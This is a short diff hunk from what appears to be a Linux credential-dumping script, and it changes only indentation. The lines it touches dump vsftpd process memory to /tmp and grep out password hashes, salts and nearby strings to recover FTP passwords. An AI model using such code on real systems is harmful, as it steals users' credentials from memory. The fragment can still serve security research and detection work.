@@ -149,10 +149,10 @@ if [[ -e "/etc/vsftpd.conf" ]]; then
 	#if exists aka someone logged into FTP then extract...
 	if [[ $PID ]];then
 		while read -r pid; do
-				dump_pid "$PID"
-				HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
-				SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-				DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
+			dump_pid "$PID"
+			HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
+			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
+			DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
 			#Remove dupes to speed up processing
 			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
 			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
